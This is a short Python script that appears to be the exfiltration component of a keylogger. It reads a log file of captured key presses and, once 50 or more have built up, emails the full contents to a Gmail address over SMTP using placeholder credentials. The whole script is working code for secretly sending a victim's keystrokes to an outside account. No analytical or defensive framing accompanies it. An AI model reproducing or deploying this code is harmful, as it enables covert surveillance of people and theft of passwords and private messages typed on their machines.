# Importing libs
from smtplib import SMTP_SSL
from datetime import date

# Open log file, read all the log and get the number of lines
file = open("log_file", "r")
file_text = file.read()
file.close()
nlines = file_text.count('\n')

# If the log have more than 50 keys pressed(number of lines) it will be emailed
if nlines >= 50:
    today = str(date.today())
    email_text = 'Subject: Your e-mail subject ' + today + '\n\n'
    email_text += file_text
    email_text = email_text.encode('utf-8') 

    connection = SMTP_SSL('smtp.gmail.com', 465)
    connection.login('xxxxxxxxxx@gmail.com', 'xxxx xxxx xxxx xxxx')
    connection.sendmail('', 'xxxxxxxxxx@gmail.com', email_text)
    connection.quit()